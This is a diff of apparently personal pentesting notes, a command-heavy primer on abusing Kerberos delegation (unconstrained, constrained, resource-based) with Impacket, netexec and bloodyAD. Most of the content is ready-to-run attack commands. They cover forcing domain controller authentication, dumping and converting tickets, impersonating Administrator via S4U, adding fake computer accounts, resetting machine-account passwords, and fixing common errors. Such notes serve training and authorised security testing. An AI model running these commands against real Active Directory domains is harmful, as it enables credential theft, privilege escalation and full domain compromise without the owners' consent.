@@ -1,39 +1,63 @@
 The following section details methods to enumerate and abuse Kerberos and its associated delegation features. This section is NOT concerned with OPSEC or theory, but serves as a primer to abusing Kerberos via Linux and the Impacket Suite (mostly).
 
 For a detailed understanding of delegation, see [[12 Kerberos]]
-
-Enumeration
+#### Enumeration
 ```bash
 # Enumerating -- Make note of FULL spn, including PORT
 impacket-findDelegation [DOMAIN]/[user]:[password] -target-domain [DOMAIN]
 	# This checks for the following:
-	Unconstrained Delegation
-	Constrained Delegation (S4U2proxy)
-	Protocol Transition (S4U2self)
-	Resource-Based Constrained Delegation
+	# Unconstrained Delegation
+	# Constrained Delegation (S4U2proxy)
+	# Protocol Transition (S4U2self)
+	# Resource-Based Constrained Delegation
+
+# Check MachineAccountQuota (critical for RBCD -- see RBCD section)
+netexec ldap [DC_IP] -u [user] -p [password] -M maq
+
+# Check Protected Users group (members CANNOT be impersonated via S4U2self -- delegation fails silently)
+netexec ldap [DC_IP] -u [user] -p [password] --groups "Protected Users"
+# OR
+bloodyAD -d [DOMAIN] -u [user] -p [password] --host [DC_IP] get group 'Protected Users' --members
 
 # Moving to vulnerable host (EXAMPLE)
 impacket-wmiexec [DOMAIN]/[user]:[password]@[hostname.domain]
 ```
 
-Converting Tickets (also see [[Kerberos Tickets]])
+#### Converting Tickets
+also see [[Kerberos Tickets]]
 ```bash
 echo "[BASE64_STRING_FROM_RUBEUS]" | base64 -d > captured_tgt.kirbi 
 impacket-ticketConverter captured_tgt.kirbi captured_tgt.ccache  # convert
 export KRB5CCNAME=/path/to/captured_tgt.ccache    # dont forget krb5.conf
 ```
+
+#### SeEnableDelegationPrivilege
+Allows configuring delegation on existing objects
+```powershell
+## Example - Configure constrained delegation with protocol transition on FS01$
+# Modifying delegation (from DC)
+Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
+Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
+
+# Change computer account password (User needs GenericAll)
+netexec smb dc.redelegate.vl -u '<user>' -p '<pass>' -M change-password -o USER='FS01$' NEWPASS=Password123
+
+# Then request service ticket as usual ( you have the password now!!! - see constrained delegation section)
+```
+
 #### Lateral Movement Services Cheat Sheet
 
-| **Name** | **Description**                                                      | **Ticket(s)**                          |
-| -------- | -------------------------------------------------------------------- | -------------------------------------- |
-| SMB      | Access the remote filesystem.  View, list, upload, & delete files.   | CIFS                                   |
-| PsExec   | Run a binary via the Service Control Manager.                        | CIFS                                   |
-| WinRM    | Windows Remote Management.                                           | HTTP                                   |
-| WMI      | Execute applications on the remote target, e.g. process call create. | RPCSS  <br>HOST  <br>RestrictedKrbHost |
-| RDP      | Remote Desktop Protocol.                                             | TERMSRV  <br>HOST                      |
-| MSSQL    | MS SQL Databases.                                                    | MSSQLSvc                               |
+|**Name**|**Description**|**Ticket(s)**|
+|---|---|---|
+|SMB|Access the remote filesystem. View, list, upload, & delete files.|CIFS|
+|PsExec|Run a binary via the Service Control Manager.|CIFS|
+|WinRM|Windows Remote Management.|HTTP|
+|WMI|Execute applications on the remote target, e.g. process call create.|RPCSS <br>HOST <br>RestrictedKrbHost|
+|RDP|Remote Desktop Protocol.|TERMSRV <br>HOST|
+|MSSQL|MS SQL Databases.|MSSQLSvc|
 
 # Unconstrained Delegation
+
 Unconstrained is the first type of delegation and the most dangerous. Compromise of a computer with unconstrained delegation means we can extract TGTs from memory.
 
 Unconstrained Delegation
@@ -66,7 +90,7 @@ S4U2self (Protocol Transition) Computer Takeover (Forcing auth for unconstrained
 # Force DC to authenticate to monitored system using SpoolSample or PetitPotam
 # First way: From our linux box
 1. python3 printerbug.py [DOMAIN]/[user]:[password]@[DC_HOSTNAME] [monitored host]
-# Second way: From the windows box
+# Second way: From the windows box (no forwarding required :))
 1. .\SharpSpoolTrigger.exe [DC hostname] [monitored host]
 
 # Dump the TGT of the DC from the compromised machine's memory
@@ -86,9 +110,12 @@ impacket-smbclient -k -no-pass lon-dc-1.contoso.com
 ```
 
 # Constrained Delegation
+
 Constrained delegation is set on a front-end service and defines the back-end service(s) to which it can delegate to. We can still obtain the TGT for the computer account. Getting ST varies.
 
 First, move laterally to the vulnerable computer
+
+> **Note: Delegation on User Accounts** — Constrained delegation can also be configured on **service accounts**, not just computer accounts. The attack chain is identical but credential extraction differs. No LSA dump — instead look for: Kerberoasting the account, creds in LSASS if the account runs a service on a compromised host, passwords in GPP/scripts/LDAP description fields.
 
 S4U w/ Protocol Transition Enabled
 ```bash
@@ -136,8 +163,11 @@ impacket-smbclient -k -no-pass lon-fs-1.contoso.com
 unset KRB5CCNAME
 rm [victim_user].ccache captured_user_tgs.ccache
 ```
+
 #### Service Name Substitution
 Service Name Substitution is a technique that allows us to "swap" a service ticket for one service, to another service. Useful if we need a more useful service, like CIFS or something. See cheat sheet.
+
+> **`-altservice` Stacking** — `impacket-getST` supports comma-separated `-altservice` values to grab multiple service tickets in one shot. Useful when you need CIFS (filesystem) + LDAP (DCSync) from the same delegation chain: `impacket-getST -spn time/lon-dc-1.contoso.com -altservice cifs/lon-dc-1.contoso.com,ldap/lon-dc-1.contoso.com -impersonate Administrator ...`
 
 Service Name Substitution w/ Protocol Transition enabled
 ```bash
@@ -193,10 +223,18 @@ impacket-smbclient -k -no-pass lon-dc-1.contoso.com
 unset KRB5CCNAME
 rm [victim_user].ccache captured_user_tgs.ccache
 ```
+
 # Resource-Based Constrained Delegation
+
+> **Cross-Domain Note:** RBCD works across domain trusts within a forest. A principal in Domain A can be written into `msDS-AllowedToActOnBehalfOfOtherIdentity` on a resource in Domain B — especially dangerous in multi-domain environments.
 
 RBCD
 ```bash
+# Check MAQ before attempting RBCD
+netexec ldap [DC_IP] -u [user] -p [password] -M maq
+# OR
+bloodyAD -d [DOMAIN] -u [user] -p [password] --host [DC_IP] get object 'DC=domain,DC=com' --attr ms-DS-MachineAccountQuota
+
 # 1. Gain control of a principal with an SPN by adding our own fake computer to the domain
 impacket-addcomputer '[DOMAIN]/[user]:[password]' -computer-name 'ATTACKER$' -computer-pass 'FakePass123!' -dc-ip [DC_IP]
 
@@ -215,3 +253,34 @@ impacket-smbclient -k -no-pass lon-fs-1.contoso.com
 # 6. Cleanup - remove our entry
 impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'lon-fs-1$' -action 'flush' '[DOMAIN]/[user]:[password]' -dc-ip [DC_IP]
 ```
+
+RBCD w/ MAQ = 0 (fallback — use an existing compromised account with an SPN)
+```bash
+# When MAQ is 0, you can't add a fake computer. Alternatives:
+#   - A computer account you already compromised
+#   - A user account you can set an SPN on (requires write privs to servicePrincipalName)
+
+# Example using an already compromised computer account (lon-ws-2$)
+# Skip step 1 — go straight to writing the RBCD attribute
+
+# 2. Write RBCD attribute using your controlled principal
+impacket-rbcd -delegate-from 'lon-ws-2$' -delegate-to 'lon-fs-1$' -action 'write' '[DOMAIN]/[user]:[password]' -dc-ip [DC_IP]
+
+# 3. S4U using the compromised computer account's hash
+impacket-getST -spn cifs/lon-fs-1.contoso.com -impersonate Administrator -dc-ip [DC_IP] '[DOMAIN]/lon-ws-2$' -hashes :[NTLM_HASH_OF_WS2]
+
+# 4-6. Same as above (inject, abuse, cleanup)
+```
+
+# Common Errors
+
+|**Error**|**Cause**|**Fix**|
+|---|---|---|
+|`KRB_AP_ERR_SKEW`|Clock difference > 5 min between attacker and DC|`sudo ntpdate -u <DC_IP>` or `sudo rdate -n <DC_IP>`|
+|`KDC_ERR_BADOPTION`|Target user is in Protected Users, or delegation is misconfigured|Check Protected Users membership; verify delegation settings|
+|`KDC_ERR_S_PRINCIPAL_UNKNOWN`|SPN doesn't exist or wrong format|Use full SPN from `findDelegation` output including hostname and port|
+|`KDC_ERR_C_PRINCIPAL_UNKNOWN`|Account doesn't exist or wrong domain format|Verify account name and domain; use `DOMAIN/account$` format|
+|`KRB_AP_ERR_MODIFIED`|Hash/password is wrong for the account|Re-extract credentials; confirm correct account|
+|Impacket silently fails / hangs|Missing or misconfigured `/etc/krb5.conf`|Add realm + KDC entries — see [[krb5.conf]] notes|
+|S4U2self returns non-forwardable|Protocol transition is disabled on the principal|Need a captured user TGS; use `-additional-ticket` flag|
+|`MachineAccountQuota` = 0|Can't add fake computer for RBCD|Use existing compromised computer account (see MAQ=0 fallback above)|
